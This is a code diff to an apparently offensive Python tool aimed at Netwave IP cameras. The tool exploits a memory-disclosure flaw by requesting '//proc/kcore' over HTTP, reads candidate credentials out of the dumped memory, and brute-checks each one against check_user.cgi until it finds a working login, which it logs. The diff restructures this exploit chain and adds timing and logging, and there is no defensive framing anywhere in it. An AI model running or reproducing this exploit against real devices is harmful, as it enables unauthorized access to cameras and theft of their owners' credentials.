@@ -7,6 +7,7 @@ import itertools
 import logging
 import re
 from dataclasses import dataclass
+from datetime import datetime
 from typing import Any, List, Optional, Tuple
 
 import aiohttp
@@ -33,9 +34,6 @@ class DeviceCredentials:
             return f"{self.username}@{self.host}:{self.port}"
 
         return f"{self.username}:{self.password}@{self.host}:{self.port}"
-
-    def __bool__(self) -> bool:
-        return self.username is not None
 
 
 @dataclass
@@ -83,8 +81,6 @@ class NetwaveDevice:
             connector=aiohttp.TCPConnector(limit=8192),
             timeout=aiohttp.ClientTimeout(30),
         )
-
-        self._empty_credentials = DeviceCredentials(host, port)
 
     def __str__(self) -> str:
         return f"{self._host}:{self._port}"
@@ -201,11 +197,11 @@ class NetwaveDevice:
 
         return list(filtered_strings)
 
-    async def _get_credentials(
+    async def _dump_memory(
         self, device_id: str, *, timeout: int = 300
-    ) -> DeviceCredentials:
+    ) -> List[DeviceCredentials]:
         """
-        Get the credentials of the Netwave IP camera.
+        Dump the memory of the Netwave IP camera and retrieve possible credentials.
 
         Parameters
         ----------
@@ -217,8 +213,8 @@ class NetwaveDevice:
 
         Returns
         -------
-        DeviceCredentials
-            The credentials of the Netwave IP camera.
+        List[DeviceCredentials]
+            A list of possible credentials for the Netwave IP camera.
         """
         async with self._session.get(
             f"http://{self}//proc/kcore", timeout=aiohttp.ClientTimeout(timeout)
@@ -228,7 +224,7 @@ class NetwaveDevice:
                 or response.headers.get("Server") != "Netwave IP Camera"
             ):
                 logger.error("[%s] Device is not vulnerable", self)
-                return self._empty_credentials
+                return []
 
             logger.info("[%s] Dumping memory...", self)
 
@@ -238,38 +234,48 @@ class NetwaveDevice:
                 if not possible_credentials:
                     continue
 
-                logger.info(
-                    "[%s] Found device ID in memory dump, "
-                    "looking for valid credentials...",
-                    self,
-                )
-
-                for credentials in possible_credentials:
-                    if await self._check_credentials(credentials):
-                        if credentials.password is None:
-                            logger.info(
-                                "[%s] Found valid credentials: %s",
-                                self,
-                                credentials.username,
-                            )
-                        else:
-                            logger.info(
-                                "[%s] Found valid credentials: %s:%s",
-                                self,
-                                credentials.username,
-                                credentials.password,
-                            )
-
-                        return credentials
-
-                logger.error(
-                    "[%s] Could not find valid credentials in memory dump", self
-                )
-
-                return self._empty_credentials
+                return possible_credentials
 
             logger.error("[%s] Could not find device ID in memory dump", self)
-            return self._empty_credentials
+            return []
+
+    async def _get_valid_credentials(
+        self, possible_credentials: List[DeviceCredentials]
+    ) -> Optional[DeviceCredentials]:
+        """
+        Get the valid credentials from the list of possible credentials.
+
+        Parameters
+        ----------
+        credentials : List[DeviceCredentials]
+            A list of possible credentials for the Netwave IP camera.
+
+        Returns
+        -------
+        Optional[DeviceCredentials]
+            The valid credentials for the Netwave IP camera.
+            Returns None if no valid credentials were found.
+        """
+        for credentials in possible_credentials:
+            if await self._check_credentials(credentials):
+                if credentials.password is None:
+                    logger.info(
+                        "[%s] Found valid credentials: %s",
+                        self,
+                        credentials.username,
+                    )
+                else:
+                    logger.info(
+                        "[%s] Found valid credentials: %s:%s",
+                        self,
+                        credentials.username,
+                        credentials.password,
+                    )
+
+                return credentials
+
+        logger.error("[%s] Could not find valid credentials in memory dump", self)
+        return None
 
     @retry(retry=retry_if_not_exception_type(ValueError))
     async def _check_credentials(self, credentials: DeviceCredentials) -> bool:
@@ -294,8 +300,8 @@ class NetwaveDevice:
         else:
             auth = aiohttp.BasicAuth(credentials.username, credentials.password)
 
-        async with await asyncio.shield(
-            self._session.get(f"http://{self}/check_user.cgi", auth=auth)
+        async with self._session.get(
+            f"http://{self}/check_user.cgi", auth=auth
         ) as response:
             if response.status == 200:
                 return True
@@ -333,6 +339,7 @@ class NetwaveDevice:
             try:
                 text = await response.text()
             except UnicodeDecodeError:
+                logger.error("[%s] Could not decode status response", self)
                 return None
 
         for line in text.splitlines():
@@ -344,11 +351,12 @@ class NetwaveDevice:
             device_id = device_id_match.group(1)
             return device_id
 
+        logger.error("[%s] Could not find device ID in status response", self)
         return None
 
     async def get_credentials(
         self, device_id: Optional[str] = None, *, timeout: int = 300
-    ) -> DeviceCredentials:
+    ) -> Optional[DeviceCredentials]:
         """
         Get the credentials of the Netwave IP camera.
 
@@ -358,7 +366,8 @@ class NetwaveDevice:
             The device ID of the Netwave IP camera, by default None.
             If None, the device ID will be retrieved.
         timeout : int, optional
-            The timeout in seconds for retrieving the credentials, by default 300.
+            The timeout in seconds for retrieving the credentials from the memory dump,
+            by default 300.
 
         Returns
         -------
@@ -369,18 +378,39 @@ class NetwaveDevice:
             device_id = device_id or await self.get_device_id()
         except (ConnectionError, TimeoutError, aiohttp.ClientError):
             logger.error("[%s] Could not get device ID", self)
-            return self._empty_credentials
+            return None
 
         if device_id is None:
-            logger.error("[%s] Could not get device ID", self)
-            return self._empty_credentials
+            return None
 
         logger.info("[%s] Device ID: %s", self, device_id)
+        start = datetime.now()
 
         try:
-            return await asyncio.wait_for(
-                self._get_credentials(device_id, timeout=timeout), timeout
-            )
+            possible_credentials = await self._dump_memory(device_id, timeout=timeout)
         except (ConnectionError, TimeoutError, aiohttp.ClientError):
-            logger.error("[%s] Could not get credentials", self)
-            return self._empty_credentials
+            logger.error("[%s] Could not dump memory", self)
+            return None
+
+        if not possible_credentials:
+            return None
+
+        remaining_time = timeout - (datetime.now() - start).total_seconds()
+
+        logger.info(
+            "[%s] Found %s possible credentials", self, f"{len(possible_credentials):,}"
+        )
+
+        try:
+            credentials = await asyncio.wait_for(
+                self._get_valid_credentials(possible_credentials),
+                timeout=remaining_time,
+            )
+        except TimeoutError:
+            logger.error("[%s] Could not get valid credentials", self)
+            return None
+
+        if credentials is None:
+            return None
+
+        return credentials
